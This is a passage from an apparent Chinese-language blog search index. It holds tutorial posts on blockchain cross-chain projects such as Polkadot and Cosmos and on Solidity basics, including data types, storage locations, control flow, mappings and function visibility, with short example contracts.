总体而言，跨链技术在过去几年间得到了迅速发展，相关的项目层出不穷。现有的跨链相关项目中，基于侧链/中继模式的项目占比最高；基于哈希锁定的闪电网络自主网上线以来节点数量、通道数量和网络容量不断增长，技术可行性得到了较好的验证；通信协议簇（通过规定一系列通信数据格式与协议规范等实现区块链接入）类项目未来能否成为主流跨链方案一定程度上取决于业界对于相关标准规范的接受度。但是目前跨链技术尚未完全成熟和广泛应用,仍有较大的提升空间。此外除了跨链本身的技术形态演进，跨链技术未来的发展也与跨链技术的应用模式密切相关。 ","date":"2021-02-26","objectID":"/posts/what-is-the-cross-chain-of-blockchain.html:2:0","tags":["基础知识","区块链","跨链技术"],"title":"区块链“跨链”是什么？为什么要“跨链”？","uri":"/posts/what-is-the-cross-chain-of-blockchain.html"},{"categories":["基础知识"],"content":"2 跨链代表 早期以Interledger与btc Relay为代表的跨链技术更多关注的是资产转移，现有跨链技术更关注跨链基础设施的落地，强调智能合约和去中心化，并接入各种跨链应用，侧重商业落地。目前跨链项目众多，最为大家所熟知的莫过于跨链双雄：Polkadot 和 Cosmos。 Polkadot是一种异构多链技术：主要由中继链、平行链和跨链桥组成。中继链相当于一个有很多插槽的插座，平行链就是各类家用电器，这些家电插上电，就能获得电力并运行。而平行链要与Polkadot之外的公链进行沟通的话就需要通过跨链桥来搭建在中继链上。 Cosmos是一个支持跨链交互的异构网络：它的目标是创建一个区块链互联网，允许大量自主且易开发的区块链互相扩展和交互。Cosmos的技术特点主要集中于三方面：一是Tendermint共识协议，属于拜占庭容错类的共识算法，在拜占庭节点数不超过 1/3的情况下，能够保证共识的安全性。二是Cosmos SDK，将共识算法和网络模块封装起来，形成一套开箱即用的区块链开发框架，开发者可以在其基础上快速定制开发适合自己需求的公链；三是IBC，也就是区块链间通信协议，它允许不同的区块链实现相互通信，也是Cosmos跨链的核心。 ","date":"2021-02-26","objectID":"/posts/what-is-the-cross-chain-of-blockchain.html:3:0","tags":["基础知识","区块链","跨链技术"],"title":"区块链“跨链”是什么？为什么要“跨链”？","uri":"/posts/what-is-the-cross-chain-of-blockchain.html"},{"categories":["基础知识"],"content":"总结 随着区块链技术的不断发展与创新，大量区块链项目如雨后春笋般问世，万链共存是未来的趋势。跨链技术使不同领域不同功能链之间能够更好地实现互联互通与价值流动，同时还极大地降低了传输成本。当资产能够简单、安全的自由流通时，区块链生态将迎来大爆炸式增长。 ","date":"2021-02-26","objectID":"/posts/what-is-the-cross-chain-of-blockchain.html:4:0","tags":["基础知识","区块链","跨链技术"],"title":"区块链“跨链”是什么？为什么要“跨链”？","uri":"/posts/what-is-the-cross-chain-of-blockchain.html"},{"categories":["基础知识","Solidity 基础"],"content":"变量初始值与变量删除 ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:1:0","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"值类型初始值 boolean: false string: \"\" int: 0 uint: 0 enum: 枚举中的第一个元素 address: 0x0000000000000000000000000000000000000000 (或 address(0)) function internal: 空白函数 external: 空白函数 可以用public变量的getter函数验证上面写的初始值是否正确： bool public _bool; // false string public _string; // \"\" int public _int; // 0 uint public _uint; // 0 address public _address; // 0x0000000000000000000000000000000000000000 enum ActionSet { Buy, Hold, Sell} ActionSet public _enum; // 第1个内容Buy的索引0 function fi() internal{} // internal空白函数 function fe() external{} // external空白函数 ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:1:1","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"引用类型初始值 映射mapping: 所有元素都为其默认值的mapping 结构体struct: 所有成员设为其默认值的结构体 数组array 动态数组: [] 静态数组（定长）: 所有成员设为其默认值的静态数组 可以用public变量的getter函数验证上面写的初始值是否正确： // Reference Types uint[8] public _staticArray; // 所有成员设为其默认值的静态数组[0,0,0,0,0,0,0,0] uint[] public _dynamicArray; // `[]` mapping(uint =\u003e address) public _mapping; // 所有元素都为其默认值的mapping // 所有成员设为其默认值的结构体 0, 0 struct Student{ uint256 id; uint256 score; } Student public student; ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:1:2","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"delete操作符 delete a会让变量a的值变为初始值。 // delete操作符 bool public _bool2 = true; function d() external { delete _bool2; // delete 会让_bool2变为默认值，false } ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:1:3","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"控制流 Solidity的控制流与其他语言类似，主要包含以下几种： ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:2:0","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"if-else function ifElseTest(uint256 _number) public pure returns(bool){ if(_number == 0){ return(true); }else{ return(false); } } ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:2:1","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"for循环 function forLoopTest() public pure returns(uint256){ uint sum = 0; for(uint i = 0; i \u003c 10; i++){ sum += i; } return(sum); } ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:2:2","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"while循环 function whileTest() public pure returns(uint256){ uint sum = 0; uint i = 0; while(i \u003c 10){ sum += i; i++; } return(sum); } ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:2:3","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"do-while循环 function doWhileTest() public pure returns(uint256){ uint sum = 0; uint i = 0; do{ sum += i; i++; }while(i \u003c 10); return(sum); } ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:2:4","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"三元运算符 三元运算符是solidity中唯一一个接受三个操作数的运算符，规则条件? 条件为真的表达式:条件为假的表达式。 此运算符经常用作 if 语句的快捷方式。 // 三元运算符 ternary/conditional operator function ternaryTest(uint256 x, uint256 y) public pure returns(uint256){ // return the max of x and y return x \u003e= y ? x: y; } ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:2:5","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":"continue \u0026 break 另外还有continue（立即进入下一个循环）和break（跳出当前循环）关键字可以使用。 ","date":"2021-02-16","objectID":"/posts/solidity-init-value.html:2:6","tags":["solidity","basic"],"title":"合约的变量初始值与控制流","uri":"/posts/solidity-init-value.html"},{"categories":["基础知识","Solidity 基础"],"content":" 为何要声明数据存储的位置？ 引用类型(Reference Type)：包括数组（array），结构体（struct）和映射（mapping），这类变量占空间大，赋值时候直接传递地址（类似指针）。由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。 ","date":"2021-02-11","objectID":"/posts/solidity-storage-memory-calldata.html:0:0","tags":["solidity","basic"],"title":"合约中变量作用域和数据存储","uri":"/posts/solidity-storage-memory-calldata.html"},{"categories":["基础知识","Solidity 基础"],"content":"数据位置 solidity数据存储位置有三类：storage，memory和calldata。不同存储位置的gas成本不同。storage类型的数据存在链上，类似计算机的硬盘，消耗gas多；memory和calldata类型的临时存在内存里，消耗gas少。大致用法： storage：合约里的状态变量默认都是storage，存储在链上。 memory：函数里的参数和临时变量一般用memory，存储在内存中，不上链。 calldata：和memory类似，存储在内存中，不上链。与memory的不同点在于calldata变量不能修改（immutable），一般用于函数的参数。例子： function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata){ //参数为calldata数组，不能被修改 // _x[0] = 0 //这样修改会报错 return(_x); } Example: ","date":"2021-02-11","objectID":"/posts/solidity-storage-memory-calldata.html:1:0","tags":["solidity","basic"],"title":"合约中变量作用域和数据存储","uri":"/posts/solidity-storage-memory-calldata.html"},{"categories":["基础知识","Solidity 基础"],"content":"数据位置和赋值规则 在不同存储类型相互赋值时候，有时会产生独立的副本（修改新变量不会影响原变量），有时会产生引用（修改新变量会影响原变量）。规则如下： storage（合约的状态变量）赋值给本地storage（函数里的）时候，会创建引用，改变新变量会影响原变量。例子： uint[] x = [1,2,3]; // 状态变量：数组 x function fStorage() public{ //声明一个storage的变量 xStorage，指向x。修改xStorage也会影响x uint[] storage xStorage = x; xStorage[0] = 100; } Example: storage赋值给memory，会创建独立的副本，修改其中一个不会影响另一个；反之亦然。例子： uint[] x = [1,2,3]; // 状态变量：数组 x function fMemory() public view{ //声明一个Memory的变量xMemory，复制x。修改xMemory不会影响x uint[] memory xMemory = x; xMemory[0] = 100; xMemory[1] = 200; uint[] memory xMemory2 = x; xMemory2[0] = 300; } Example: memory赋值给memory，会创建引用，改变新变量会影响原变量。 其他情况，变量赋值给storage，会创建独立的副本，修改其中一个不会影响另一个。 ","date":"2021-02-11","objectID":"/posts/solidity-storage-memory-calldata.html:1:1","tags":["solidity","basic"],"title":"合约中变量作用域和数据存储","uri":"/posts/solidity-storage-memory-calldata.html"},{"categories":["基础知识","Solidity 基础"],"content":"变量的作用域 Solidity中变量按作用域划分有三种，分别是状态变量（state variable），局部变量（local variable）和全局变量(global variable) ","date":"2021-02-11","objectID":"/posts/solidity-storage-memory-calldata.html:2:0","tags":["solidity","basic"],"title":"合约中变量作用域和数据存储","uri":"/posts/solidity-storage-memory-calldata.html"},{"categories":["基础知识","Solidity 基础"],"content":"1. 状态变量 状态变量是数据存储在链上的变量，所有合约内函数都可以访问 ，gas消耗高。状态变量在合约内、函数外声明： contract Variables { uint public x = 1; uint public y; string public z; 我们可以在函数里更改状态变量的值： function foo() external{ // 可以在函数里更改状态变量的值 x = 5; y = 2; z = \"0xAA\"; } ","date":"2021-02-11","objectID":"/posts/solidity-storage-memory-calldata.html:2:1","tags":["solidity","basic"],"title":"合约中变量作用域和数据存储","uri":"/posts/solidity-storage-memory-calldata.html"},{"categories":["基础知识","Solidity 基础"],"content":"2. 局部变量 局部变量是仅在函数执行过程中有效的变量，函数退出后，变量无效。局部变量的数据存储在内存里，不上链，gas低。局部变量在函数内声明： function bar() external pure returns(uint){ uint xx = 1; uint yy = 3; uint zz = xx + yy; return(zz); } ","date":"2021-02-11","objectID":"/posts/solidity-storage-memory-calldata.html:2:2","tags":["solidity","basic"],"title":"合约中变量作用域和数据存储","uri":"/posts/solidity-storage-memory-calldata.html"},{"categories":["基础知识","Solidity 基础"],"content":"3. 全局变量 全局变量是全局范围工作的变量，都是solidity预留关键字。他们可以在函数内不声明直接使用： function global() external view returns(address, uint, bytes memory){ address sender = msg.sender; uint blockNum = block.number; bytes memory data = msg.data; return(sender, blockNum, data); } 在上面例子里，我们使用了3个常用的全局变量：msg.sender, block.number和msg.data，他们分别代表请求发起地址，当前区块高度，和请求数据。下面是一些常用的全局变量，更完整的列表请看这个链接： blockhash(uint blockNumber): (bytes32)给定区块的哈希值 – 只适用于256最近区块, 不包含当前区块。 block.coinbase: (address payable) 当前区块矿工的地址 block.gaslimit: (uint) 当前区块的gaslimit block.number: (uint) 当前区块的number block.timestamp: (uint) 当前区块的时间戳，为unix纪元以来的秒 gasleft(): (uint256) 剩余 gas msg.data: (bytes calldata) 完整call data msg.sender: (address payable) 消息发送者 (当前 caller) msg.sig: (bytes4) calldata的前四个字节 (function identifier) msg.value: (uint) 当前交易发送的wei值 Example: ","date":"2021-02-11","objectID":"/posts/solidity-storage-memory-calldata.html:2:3","tags":["solidity","basic"],"title":"合约中变量作用域和数据存储","uri":"/posts/solidity-storage-memory-calldata.html"},{"categories":["基础知识","Solidity 基础"],"content":"4. 以太单位与时间单位 以太单位 Solidity中不存在小数点，以0代替为小数点，来确保交易的精确度，并且防止精度的损失，利用以太单位可以避免误算的问题，方便程序员在合约中处理货币交易。 wei: 1 gwei: 1e9 = 1000000000 ether: 1e18 = 1000000000000000000 function weiUnit() external pure returns(uint) { assert(1 wei == 1e0); assert(1 wei == 1); return 1 wei; } function gweiUnit() external pure returns(uint) { assert(1 gwei == 1e9); assert(1 gwei == 1000000000); return 1 gwei; } function etherUnit() external pure returns(uint) { assert(1 ether == 1e18); assert(1 ether == 1000000000000000000); return 1 ether; } 时间单位 可以在合约中规定一个操作必须在一周内完成，或者某个事件在一个月后发生。这样就能让合约的执行可以更加精确，不会因为技术上的误差而影响合约的结果。因此，时间单位在Solidity中是一个重要的概念，有助于提高合约的可读性和可维护性。 seconds: 1 minutes: 60 seconds = 60 hours: 60 minutes = 3600 days: 24 hours = 86400 weeks: 7 days = 604800 function secondsUnit() external pure returns(uint) { assert(1 seconds == 1); return 1 seconds; } function minutesUnit() external pure returns(uint) { assert(1 minutes == 60); assert(1 minutes == 60 seconds); return 1 minutes; } function hoursUnit() external pure returns(uint) { assert(1 hours == 3600); assert(1 hours == 60 minutes); return 1 hours; } function daysUnit() external pure returns(uint) { assert(1 days == 86400); assert(1 days == 24 hours); return 1 days; } function weeksUnit() external pure returns(uint) { assert(1 weeks == 604800); assert(1 weeks == 7 days); return 1 weeks; } ","date":"2021-02-11","objectID":"/posts/solidity-storage-memory-calldata.html:2:4","tags":["solidity","basic"],"title":"合约中变量作用域和数据存储","uri":"/posts/solidity-storage-memory-calldata.html"},{"categories":["基础知识","Solidity 基础"],"content":" Solidity中的变量类型 数值类型(Value Type)：包括布尔型，整数型等等，这类变量赋值时候直接传递数值。 引用类型(Reference Type)：包括数组和结构体，这类变量占空间大，赋值时候直接传递地址（类似指针）。 映射类型(Mapping Type): Solidity里的哈希表。 函数类型(Function Type)：Solidity文档里把函数归到数值类型，但我觉得他跟其他类型差别很大，所以单独分一类。 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:0:0","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"1 数值类型(Value Type) ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:1:0","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"布尔型 布尔型是二值变量，取值为true或false。 bool public _bool = true; // 布尔值 布尔值的运算符，包括： ! （逻辑非） \u0026\u0026 （逻辑与， “and” ） || （逻辑或， “or” ） == （等于） != （不等于） 代码： // 布尔运算 bool public _bool1 = !_bool; //取非 bool public _bool2 = _bool \u0026\u0026 _bool1; //与 bool public _bool3 = _bool || _bool1; //或 bool public _bool4 = _bool == _bool1; //相等 bool public _bool5 = _bool != _bool1; //不相等 上面的代码中：变量_bool的取值是true；_bool1是_bool的非，为false；_bool \u0026\u0026 _bool1为false；_bool || _bool1为true；_bool == _bool1为false；_bool != _bool1为true。 值得注意的是：\u0026\u0026 和 ||运算符遵循短路规则，这意味着，假如存在f(x) || g(y)的表达式，如果f(x)是true，g(y)不会被计算，即使它和f(x)的结果是相反的 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:1:1","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"整型 整型是solidity中的整数，最常用的包括 // 整型 int public _int = -1; // 整数，包括负数 uint public _uint = 1; // 正整数 uint256 public _number = 20220330; // 256位正整数 常用的整型运算符包括： 比较运算符（返回布尔值）： \u003c=， \u003c， ==， !=， \u003e=， \u003e 算数运算符： +， -， *， /， %（取余），**（幂） 代码： // 整数运算 uint256 public _number1 = _number + 1; // +，-，*，/ uint256 public _number2 = 2**2; // 指数 uint256 public _number3 = 7 % 2; // 取余数 bool public _numberbool = _number2 \u003e _number3; // 比大小 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:1:2","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"地址类型 地址类型(address)有两类： 普通地址（address）: 存储一个 20 字节的值（以太坊地址的大小）。 payable address: 比普通地址多了transfer和send两个成员方法，用于接收转账。 代码 // 地址 address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71; address payable public _address1 = payable(_address); // payable address，可以转账、查余额 // 地址类型的成员 uint256 public balance = _address1.balance; // balance of address ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:1:3","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"定长字节数组 字节数组bytes分两种: 定长: 属于数值类型，根据每个元素存储数据的大小分为 byte, bytes8, bytes32 等类型，每个元素最多存储 32 bytes数据。数组长度在声明之后不能改变。 不定长: 属于引用类型，数组长度在声明之后可以改变，包括 bytes 等，之后的章节会详细介绍。 代码： // 固定长度的字节数组 bytes32 public _byte32 = \"MiniSolidity\"; bytes1 public _byte = _byte32[0]; 上面代码中，MiniSolidity变量以字节的方式存储进变量_byte32。如果把它转换成16进制为，就是：0x4d696e69536f6c69646974790000000000000000000000000000000000000000 _byte变量的值为_byte32的第一个字节，即0x4d。 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:1:4","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"枚举 enum 枚举（enum）是solidity中用户定义的数据类型。它主要用于为uint分配名称，使程序易于阅读和维护。它与C语言中的enum类似，使用名称来代替从0开始的uint： // 用enum将uint 0， 1， 2表示为Buy, Hold, Sell enum ActionSet { Buy, Hold, Sell } // 创建enum变量 action ActionSet action = ActionSet.Buy; 它可以显式的和uint相互转换，并会检查转换的正整数是否在枚举的长度内，不然会报错： // enum可以和uint显式的转换 function enumToUint() external view returns(uint){ return uint(action); } enum的一个比较冷门的变量，几乎没什么人用。 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:1:5","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"2 引用类型(Reference Type) 包括数组（array），结构体（struct）和映射（mapping），这类变量占空间大，赋值时候直接传递地址（类似指针）。由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:2:0","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"数组 array 数组（Array）是solidity常用的一种变量类型，用来存储一组数据（整数，字节，地址等等）。数组分为固定长度数组和可变长度数组两种： 固定长度数组：在声明时指定数组的长度。用T[k]的格式声明，其中T是元素的类型，k是长度，例如： // 固定长度 Array uint[8] array1; bytes1[5] array2; address[100] array3; 可变长度数组（动态数组）：在声明时不指定数组的长度。用T[]的格式声明，其中T是元素的类型，例如： // 可变长度 Array uint[] array4; bytes1[] array5; address[] array6; bytes array7; 注意：bytes比较特殊，是数组，但是不用加[]。另外，不能用byte[]声明单字节数组，可以使用bytes或bytes1[]。bytes 比 bytes1[] 省gas。 创建数组的规则 在solidity里，创建数组有一些规则： 对于memory修饰的动态数组，可以用new操作符来创建，但是必须声明长度，并且声明后长度不能改变。例子： // memory动态数组 uint[] memory array8 = new uint[](5); bytes memory array9 = new bytes(9); 数组字面常数(Array Literals)是写作表达式形式的数组，用方括号包着来初始化array的一种方式，并且里面每一个元素的type是以第一个元素为准的，例如[1,2,3]里面所有的元素都是uint8类型，因为在solidity中如果一个值没有指定type的话，默认就是最小单位的该type，这里 uint 的默认最小单位类型就是uint8。而[uint(1),2,3]里面的元素都是uint类型，因为第一个元素指定了是uint类型了，我们都以第一个元素为准。 下面的例子中，如果没有对传入 g() 函数的数组进行 uint 转换，是会报错的。 // SPDX-License-Identifier: GPL-3.0 pragma solidity \u003e=0.4.16 \u003c0.9.0; contract C { function f() public pure { g([uint(1), 2, 3]); } function g(uint[3] memory) public pure { // ... } } 如果创建的是动态数组，你需要一个一个元素的赋值。 uint[] memory x = new uint[](3); x[0] = 1; x[1] = 3; x[2] = 4; 数组成员 length: 数组有一个包含元素数量的length成员，memory数组的长度在创建后是固定的。 push(): 动态数组拥有push()成员，可以在数组最后添加一个0元素，并返回该元素的引用。 push(x): 动态数组拥有push(x)成员，可以在数组最后添加一个x元素。 pop(): 动态数组拥有pop()成员，可以移除数组最后一个元素。 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:2:1","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"结构体 struct Solidity支持通过构造结构体的形式定义新的类型。结构体中的元素可以是原始类型，也可以是引用类型；结构体可以作为数组或映射的元素。创建结构体的方法： // 结构体 struct Student{ uint256 id; uint256 score; } Student student; // 初始一个student结构体 给结构体赋值的四种方法： // 给结构体赋值 // 方法1:在函数中创建一个storage的struct引用 function initStudent1() external{ Student storage _student = student; // assign a copy of student _student.id = 11; _student.score = 100; } // 方法2:直接引用状态变量的struct function initStudent2() external{ student.id = 1; student.score = 80; } // 方法3:构造函数式 function initStudent3() external { student = Student(3, 90); } // 方法4:key value function initStudent4() external { student = Student({id: 4, score: 60}); } ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:2:2","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"3 映射类型(Mapping Type) ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:3:0","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"映射Mapping 在映射中，人们可以通过键（Key）来查询对应的值（Value），比如：通过一个人的id来查询他的钱包地址。 声明映射的格式为mapping(_KeyType =\u003e _ValueType)，其中_KeyType和_ValueType分别是Key和Value的变量类型。例子： mapping(uint =\u003e address) public idToAddress; // id映射到地址 mapping(address =\u003e address) public swapPair; // 币对的映射，地址到地址 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:3:1","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"映射的规则 规则1：映射的_KeyType只能选择solidity默认的类型，比如uint，address等，不能用自定义的结构体。而_ValueType可以使用自定义的类型。下面这个例子会报错，因为_KeyType使用了我们自定义的结构体： // 我们定义一个结构体 Struct struct Student{ uint256 id; uint256 score; } mapping(Student =\u003e uint) public testVar; 规则2：映射的存储位置必须是storage，因此可以用于合约的状态变量，函数中的storage变量，和library函数的参数（见例子）。不能用于public函数的参数或返回结果中，因为mapping记录的是一种关系 (key - value pair)。 规则3：如果映射声明为public，那么solidity会自动给你创建一个getter函数，可以通过Key来查询对应的Value。 规则4：给映射新增的键值对的语法为_Var[_Key] = _Value，其中_Var是映射变量名，_Key和_Value对应新增的键值对。例子： function writeMap (uint _Key, address _Value) public{ idToAddress[_Key] = _Value; } ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:3:2","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"映射的原理 原理1: 映射不储存任何键（Key）的资讯，也没有length的资讯。 原理2: 映射使用keccak256(abi.encodePacked(key, slot))当成offset存取value，其中slot是映射变量定义所在的插槽位置。 原理3: 因为Ethereum会定义所有未使用的空间为0，所以未赋值（Value）的键（Key）初始值都是各个type的默认值，如uint的默认值是0。 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:3:3","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"4 函数类型(Function Type) ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:4:0","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"Solidity中的函数 Solidity官方文档里把函数归到数值类型，但我觉得差别很大，所以单独分一类。我们先看一下solidity中函数的形式： function \u003cfunction name\u003e(\u003cparameter types\u003e) {internal|external|public|private} [pure|view|payable] [returns (\u003creturn types\u003e)] 看着些复杂，咱们从前往后一个一个看（方括号中的是可写可不写的关键字）： function：声明函数时的固定用法，想写函数，就要以function关键字开头。 \u003cfunction name\u003e：函数名。 (\u003cparameter types\u003e)：圆括号里写函数的参数，也就是要输入到函数的变量类型和名字。 {internal|external|public|private}：函数可见性说明符，一共4种。 public: 内部外部均可见。 private: 只能从本合约内部访问，继承的合约也不能用。 external: 只能从合约外部访问（但是可以用this.f()来调用，f是函数名）。 internal: 只能从合约内部访问，继承的合约可以用。 Note 1: 合约中定义的函数需要明确指定可见性，它们没有默认值。 Note 2: public|private|internal 也可用于修饰状态变量。 public变量会自动生成同名的getter函数，用于查询数值。 Note 3: 没有标明可见性类型的状态变量，默认为internal。 [pure|view|payable]：决定函数权限/功能的关键字。payable（可支付的）很好理解，带着它的函数，运行的时候可以给合约转入ETH。pure和view的介绍见下一节。 [returns ()]：函数返回的变量类型和名称。 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:4:1","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"到底什么是Pure和View？ 我刚开始学solidity的时候，一直不理解pure跟view关键字，因为别的语言没有类似的关键字。solidity加入这两个关键字，我认为是因为gas fee。合约的状态变量存储在链上，gas fee很贵，如果不改变链上状态，就不用付gas。包含pure跟view关键字的函数是不改写链上状态的，因此用户直接调用他们是不需要付gas的（合约中非pure/view函数调用它们则会改写链上状态，需要付gas）。 在以太坊中，以下语句被视为修改链上状态： 写入状态变量。 释放事件。 创建其他合约。 使用selfdestruct. 通过调用发送以太币。 调用任何未标记view或pure的函数。 使用低级调用（low-level calls）。 使用包含某些操作码的内联汇编。 pure，中文意思是“纯”，在solidity里理解为“纯函数”。包含pure关键字的函数，不能读取也不能写入存储在链上的状态变量。 view，“看”，在solidity里理解为“看客”。包含view关键字的函数，能读取但也不能写入状态变量。 不写pure也不写view，函数既可以读取也可以写入状态变量。 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:4:2","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"代码示例 1. pure v.s. view 我们在合约里定义一个状态变量 number = 5。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; contract FunctionTypes{ uint256 public number = 5; } 定义一个add()函数，每次调用，每次给number + 1。 // 默认 function add() external{ number = number + 1; } 如果add()包含了pure关键字，例如 function add() pure external，就会报错。因为pure（纯函数）是不配读取合约里的状态变量的，更不配改写。那pure函数能做些什么？举个例子，你可以给函数传递一个参数 _number，然后让他返回 _number+1。 // pure: 纯函数 function addPure(uint256 _number) external pure returns(uint256 new_number){ new_number = _number + 1; } 如果add()包含view，比如function add() view external，也会报错。因为view能读取，但不能够改写状态变量。可以稍微改写下方程，让他不改写number，而是返回一个新的变量。 // view: 只能读 function addView() external view returns(uint256 new_number) { new_number = number + 1; } 2. internal v.s. external // internal: 内部 function minus() internal { number = number - 1; } // 合约内的函数可以调用内部函数 function minusCall() external { minus(); } 我们定义一个internal的minus()函数，每次调用使得number变量减1。由于是internal，只能由合约内部调用，而外部不能。因此，我们必须再定义一个external的minusCall()函数，来间接调用内部的minus()。 3. payable // payable: 递钱，能给合约支付eth的函数 function minusPayable() external payable returns(uint256 balance) { minus(); balance = address(this).balance; } 我们定义一个external payable的minusPayable()函数，间接的调用minus()，并且返回合约里的ETH余额（this关键字可以让我们引用合约地址)。 我们可以在调用minusPayable()时，往合约里转入1个ETH。我们可以在返回的信息中看到，合约的余额是1 ETH。 ","date":"2021-01-22","objectID":"/posts/solidity-basic.html:4:3","tags":["solidity","basic"],"title":"Solidity基础中的数值类型、引用类型、映射类型和函数类型","uri":"/posts/solidity-basic.html"},{"categories":["基础知识","Solidity 基础"],"content":"函数返回值 return和returns Solidity有两个关键字与函数输出相关：return和returns，他们的区别在于： returns加在函数名后面，用于声明返回的变量类型及变量名； return用于函数主体中，返回指定的变量。 // 返回多个变量 function returnMultiple() public pure returns(uint256, bool, uint256[3] memory){ return(1, true, [uint256(1),2,5]); } 上面这段代码中，我们声明了returnMultiple()函数将有多个输出：returns(uint256, bool, uint256[3] memory)，接着我们在函数主体中用return(1, true, [uint256(1),2,5])确定了返回值。 命名式返回 我们可以在returns中标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return。 // 命名式返回 function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array){ _number = 2; _bool = false; _array = [uint256(3),2,1]; } 在上面的代码中，我们用returns(uint256 _number, bool _bool, uint256[3] memory 